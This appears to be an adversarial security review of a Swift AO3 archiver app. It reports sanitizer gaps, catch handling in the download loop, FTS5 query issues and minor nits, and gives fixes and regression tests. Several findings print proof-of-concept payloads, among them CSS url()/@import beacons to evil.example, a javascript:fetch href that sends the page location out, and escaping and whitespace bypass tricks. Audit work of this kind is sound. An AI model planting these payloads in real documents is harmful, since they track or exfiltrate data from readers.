# Adversarial Code Review — AO3 Archiver

Date: 2026-06-17 · Reviewer: Claude (adversarial pass) · Scope: `Sources/` at `main` (b08b8de)

This is a deliberately hostile read of the code, weighted toward the project's own stated
invariants (CLAUDE.md / ARCHITECTURE.md): cookie/UA confinement, the "no remote requests"
reader guarantee, idempotent upserts, and per-item parser resilience. The codebase is in good
shape — the security boundaries that were *designed* (host allowlist, redirect cancellation,
zip-slip guard, canonical paths, Keychain storage) hold up. The findings below are the places
where a stated guarantee is **incomplete** or a resilience property doesn't extend as far as the
surrounding code implies.

Severity legend: **High** = breaks a stated security/data invariant · **Medium** = correctness
or resilience defect with real user impact · **Low** = narrow / backstopped / accepted ·
**Nit** = cosmetic, perf, or doc drift.

> **Status (2026-06-17):** all **High** and **Medium** findings (H1, M1, M2) are **fixed** — see
> the ✅ note under each. Regression tests added to `EpubReaderTests` and `selftest` (in lockstep);
> `swift build`, `swift test`, and `swift run selftest` all green. Low/Nit findings are left as
> documented backlog.

---

## H1 — `EpubSanitizer` is a denylist that never inspects CSS; remote `url()` loads on render (zero-click)

**File:** `Sources/AO3Kit/EpubSanitizer.swift` · **Severity: High** (defense-in-depth invariant
incomplete)

The reader's headline guarantee is "no remote requests, enforced **by construction** in the DOM
rather than hoping a `WKWebView` navigation delegate catches subresource loads (it doesn't)"
(EpubSanitizer.swift:9-11, and CLAUDE.md reader invariants). The sanitizer enforces this with a
denylist: it removes `strippedTags` (script/iframe/…), the `resourceAttrs` set
(`src`/`srcset`/`poster`/`background`/`data-src`/`data-original`), remote `href`, and `on*`
handlers (EpubSanitizer.swift:35-53).

**It never looks at CSS.** Two surviving vectors, one root cause:

1. **`<style>` blocks** — not in `strippedTags`, so the element survives intact. Any
   `@import url(https://…)` or `background:url(https://…)` inside it fires a network request.
2. **Inline `style=` attributes** — never enumerated, so `style="background-image:url(https://evil/x.png)"`
   survives.

Both are **zero-click subresource loads** at render time — precisely the case the code comment
admits the nav delegate "can't see" (the `decidePolicyFor` backstop in `ReaderView.swift:277-284`
only sees top-level navigations, not CSS-driven fetches). A crafted work could embed a tracking
pixel / deanonymizing beacon that loads the moment the reader opens it.

**Proof (by inspection of the transform):** the input below passes through `EpubSanitizer.sanitize`
untouched — `<style>` is not a stripped tag and `style=` is not a scrubbed attribute, so the
`https://` survives in the output:

```html
<p style="background-image:url(https://evil.example/track.png)">x</p>
<style>@import url("https://evil.example/beacon.css");</style>
```

Contrast: `<img src="https://evil/x">` *is* caught (src ∈ resourceAttrs). The asymmetry is the bug.

**Reachability caveat (keeps severity honest):** there are no EPUB-body fixtures in the repo
(only listing HTML), so I could not confirm that *real AO3-generated* EPUBs carry inline CSS that
reaches this hole, and AO3 may also filter `url()` server-side. But the by-construction claim is
explicit in the code and must not depend on AO3's sanitizer — so the gap stands regardless of
whether it's currently live-exploitable.

**Recommendation:** extend the sanitizer to (a) strip `<style>` elements, or parse and drop any
`@import`/`url(http…)`/`url(//…)` within them; and (b) scrub `style` attributes whose value
matches `url(` with a remote target (cheapest: drop the whole `style` attr when it contains a
remote `url(`, since the reader supplies its own theme CSS anyway). Add a fixture-backed test that
asserts a remote `url()` does **not** survive `sanitizedBody`.

✅ **Fixed.** `<style>` is now in `strippedTags` (dropped wholesale). Inline `style="…"` is dropped
whenever it contains `url(` or `@import` (`styleMayLoadResource(_:)`) — **not** a remote-host match:
a host denylist is bypassable by CSS escaping (`url(\68ttps://…)` → `https://…`) or inserted
whitespace (`url( //…`), whereas the literal `url(` token survives value-escaping, so dropping any
`url()`-bearing inline style is the bypass-resistant choice (the reader supplies its own theme, so
losing a rare local inline `url()` is a non-issue). Benign styles like `color:red` are kept. Tests
include the escaped-URL case: `sanitizerStripsRemoteCSS` / `schemeAndCSSClassification` (+ selftest).

---

## M1 — `SyncEngine.download` catches only `AO3Error`; a disk/DB error aborts the whole content pass

**File:** `Sources/AO3Kit/SyncEngine.swift:311-330` · **Severity: Medium**

The per-work loop is:

```swift
for work in pending {
    do {
        let data = try await downloader.downloadEPUB(workID: work.id)
        let rel  = try files.writeEPUB(data, workID: work.id, title: work.title)   // ← non-AO3Error
        try store.markDownloaded(...)                                              // ← non-AO3Error
        ...
    } catch let e as AO3Error {        // ← only AO3Error is caught per-item
        try store.markFailed(...)
    }
}
```

Only `AO3Error` is caught. `files.writeEPUB` (a `Data.write` — disk full, permissions, read-only
volume) and `store.markDownloaded` / `markFailed` (a GRDB write error) throw **plain** errors that
escape the `catch` and propagate out of `download`, aborting the **entire** content pass — and via
`try store.markFailed` inside the catch, even an AO3-error path can re-throw if the DB write fails.

This contradicts the resilience the parser side is careful to guarantee ("one bad card must never
abort a whole page", CLAUDE.md). One un-writable work shouldn't sink every later download in the
batch. The blast radius is bounded only by resumability (the next run retries), but a persistent
condition (full disk) turns every run into "fail at the first work, do nothing."

**Recommendation:** widen the per-item catch to all errors (`catch { … markFailed … }`), and wrap
the `markFailed` call itself in `try?` so a bookkeeping failure can't re-abort the loop.

✅ **Fixed.** The per-work catch is now `catch { … }` (all errors), and the `markFailed` write is
`try?`, so a disk/DB failure parks that one work and the batch continues
(`SyncEngine.download`, ~lines 311-330).

---

## M2 — `javascript:` URI schemes are not neutralized; nav-delegate backstop coverage is uncertain

**File:** `Sources/AO3Kit/EpubSanitizer.swift:58-63` · **Severity: Medium** (click-gated)

`isRemote` recognizes `http(s):`, `//`, and `ftp:`, so a remote `href` is stripped. It does **not**
recognize `javascript:`. An `<a href="javascript:fetch('https://evil/'+location)">` survives the
sanitizer.

Why this isn't fully covered by the existing backstop: a `javascript:` link click is generally
evaluated *in-page* by WebKit and may **not** route through `decidePolicyForNavigationAction`
(ReaderView.swift:277), and the `fetch()` it triggers is a subresource the delegate never sees.
JavaScript is enabled in the reader (ReaderView.swift:219). It's click-gated (no auto-fire), so it
ranks below H1.

**Note:** `data:` in an `href` is **not** a hole — navigating to a `data:` URL *is* a navigation,
so `decidePolicyFor` cancels it. Don't conflate the two.

**Recommendation:** in the per-element pass, strip `href`/`action`/`formaction` whose value
(after trim + lowercase) begins with `javascript:` or `vbscript:`. Worth confirming empirically
whether a `javascript:` href triggers `decidePolicyFor` in this WebKit; if it does, this drops to a
Nit.

✅ **Fixed.** `navAttrs` (`href`/`action`/`formaction`) are now dropped when remote **or** when
`hasDangerousScheme(_:)` matches a `javascript:`/`vbscript:` value (`data:` left alone — navigating
to it is a navigation the delegate already cancels). The scheme check first strips whitespace and
C0 control chars, so tab/newline obfuscation (`java&#9;script:`) can't slip the prefix match.
Tests: `sanitizerStripsScriptSchemeLinks` / `schemeAndCSSClassification`.

Note: this remains click-gated defense-in-depth — I could not confirm headlessly whether a
`javascript:` href even routes as executable in this WKWebView; the primary guarantee is still the
`file:`-only nav delegate plus the (now CSS-tight) sanitizer.

---

## L1 — `Store.searchWorkIDs` passes raw text straight into an FTS5 `MATCH`

**File:** `Sources/AO3Kit/Store.swift:537-542` · **Severity: Low** (currently test-only)

```swift
try Int.fetchAll(db, sql: "SELECT rowid FROM work_fts WHERE work_fts MATCH ? ORDER BY rank",
                 arguments: [query])
```

FTS5 `MATCH` has its own query grammar. User input containing `"`, `*`, `:`, `^`, `-`, `NEAR`, or
an unbalanced quote raises `SQLITE_ERROR` ("fts5: syntax error near …") — a thrown error, not
SQL injection (the value is bound), but an uncaught crash if ever wired to a search box. It is
**not** on the live filter path: gallery search uses the in-memory `searchHaystack.contains`
(GalleryModel.swift:538-539). `searchWorkIDs` is only called from the test suite / selftest.

**Recommendation:** if this becomes user-facing, quote/escape the query (wrap bare terms, double
embedded `"`) or `try?` it. Low while test-only.

---

## L2 — `work.id` PK collides between work ids and external_works ids

**File:** `Sources/AO3Kit/Store.swift:40-44` · **Severity: Low** (documented & accepted)

`work.id` is the AO3 work id for `kind='work'` and the external_works id for `kind='external'` —
independent sequences sharing one PK column. A numeric collision overwrites one with the other.
Called out in-code as an accepted limitation given 8-digit ids. Noting it for completeness; the
clean fix (namespacing the PK, e.g. composite `(kind,id)`) is a schema change, not worth it now.

---

## L3 — `WorkDownloader.epubHref` primary selector trusts `li.download` class (backstopped)

**File:** `Sources/AO3Kit/WorkDownloader.swift:27-34` · **Severity: Low**

The fallback selector is correctly anchored (`a[href^=/downloads/]`, with an explanatory comment),
but the **primary** candidate set `li.download a[href]` is not — a work page that injects
`<li class="download"><a href="https://evil/x.epub">` would have that href *selected* (its path
ends in `.epub`). It's caught one layer down: `client.getData(path:)` resolves the absolute URL,
whose host fails `isAO3Host`, throwing `disallowedHost` (AO3Client.swift:188-190). So it's not
exploitable — but the comment claims the anchoring is what prevents attacker hrefs, while the
primary path actually relies on the host allowlist. Optionally anchor the primary selector too so
the two layers agree.

---

## L4 — `incrementalSync` treats a missing `updated_at` as epoch 0 → can stop a pass early

**File:** `Sources/AO3Kit/SyncEngine.swift:215-218` · **Severity: Low** (robustness)

```swift
return pageCards.allSatisfy { ($0.updatedAt ?? 0) < watermark }
```

`updated_at` comes from an HTML comment the parser scrapes (`BlurbParser.updatedAtTimestamp`). If
AO3 drifts that comment format, every card on a page parses `updatedAt == nil → 0 < watermark`,
the whole page reads as "older than last run," and the updated-works pass **stops early** —
silently under-syncing. Fail-soft in the safe direction (never crashes) but can mask updates.

**Recommendation:** treat `nil` updatedAt as "unknown / don't count toward the frontier" rather
than "old" (e.g. `allSatisfy { c in c.updatedAt.map { $0 < watermark } ?? false }`), so an
un-parseable date can't end the pass prematurely.

---

## L5 — `reading_position.spine_index` actually stores a *section* index

**Files:** `Sources/AO3Kit/Store.swift:167-181`, `Sources/AO3Kit/ReaderModel.swift:54,171` ·
**Severity: Low** (naming + drift)

The reader navigates **sections** (the documented invariant), and `ReaderModel` writes
`session.index` (a section index) into the column named `spine_index`, and reads it back into
`ReaderSession(index:)`. It's internally consistent, so resume works — but the column name and the
migration comment ("`spine_index` is the chapter granularity") describe a different unit than what's
stored, which will mislead the next reader of the schema. Separately, after a re-download that
changes the section count, the saved index may point to a different section; `ReaderSession`
clamps it (ReaderSession.swift:117/135) so it's safe, just imprecise. Rename the column (or the
comment) to say "section".

---

## Nits

- **N1 — stale comment contradicts an invariant.** `EpubDocument.swift:278-279` still says lazy
  rendering is "via the `content-visibility` CSS on each section," but CLAUDE.md explicitly forbids
  reintroducing `content-visibility` (it makes WebKit jump scroll position), and the CSS no longer
  emits it (`ReaderSettings.injectedCSS`). Delete the sentence so no one "restores" the behavior.
- **N2 — `Store.nowISO()` allocates an `ISO8601DateFormatter` on every call** (Store.swift:544-546),
  i.e. once per upsert across thousands of rows in a sync. Make it a `static let`.
- **N3 — `ReaderModel.prepareScrollBodiesIfNeeded` re-entrancy + temp leak.** The `await` between
  the `bodiesPrepared` guard and setting it true (ReaderModel.swift:93-103) lets a second call do
  the sanitize work redundantly (result is idempotent, just wasted). And `ensureExtracted` creates a
  per-open temp dir (ReaderModel.swift:148-164) cleaned only by `cleanup()`; a crash/forced-quit
  leaks it under `…/ao3-reader/`. Both minor; a startup sweep of that folder would tidy the leak.
- **N4 — mutable closures on an `@unchecked Sendable` class.** `AO3Client.log` / `onRateLimit` are
  `var` (AO3Client.swift:128-135) on a Sendable type; safe only because they're set once at setup.
  If anything ever reassigns them concurrently with a request it's a data race. Make them `let`
  (inject via `init`) or document the set-once contract.

---

## What held up under pressure (worth recording)

- **Host confinement is sound.** `isAO3Host` matches the apex exactly and subdomains via leading
  dot — `evil-archiveofourown.org` is correctly rejected (AO3Client.swift:157-160). The request
  engine refuses non-AO3 hosts *before forming the request* (188-190), and the redirect delegate
  cancels any off-AO3 hop while re-attaching the cookie only on AO3 hosts (96-118). The cookie/UA
  cannot leave AO3 by any path I could find.
- **Zip-slip guard is correct.** `extractAll` standardizes each destination and rejects anything
  not under the root prefix (EpubDocument.swift:308-316), and absolute / `../` entry paths resolve
  back inside or get skipped.
- **Canonical paths, not raw hrefs, are persisted/opened** (BlurbParser.swift:42-49) — an
  author-controlled absolute URL can't be concatenated onto the AO3 base later.
- **Credentials live in the Keychain**, device-local, after-first-unlock, never synced, never in DB
  or logs (CredentialStore.swift).
- **Idempotent upserts** genuinely leave `epub_path`/`epub_updated_at`/`download_state` untouched
  (Store.swift:284-294), and the stale-bookmark delete-before-insert (327-329) handles re-bookmarks
  without aborting a sync.
- **The parallel facet passes** capture only `let` copies of value types and write disjoint slots
  (GalleryModel.swift:688-696) — no data race; the "parallel == serial" test guards it.

---

### Suggested priority

1. **H1** — close the CSS hole in `EpubSanitizer` (+ regression test). This is the one finding that
   breaks a stated security invariant on attacker-controlled input.
2. **M1** — widen the download catch so one disk/DB failure can't sink a whole content pass.
3. **M2** — strip `javascript:`/`vbscript:` hrefs (cheap; pairs naturally with H1).
4. **L1/L4** — harden when the relevant code path goes user-facing / when parser drift matters.
5. Nits as cleanup.
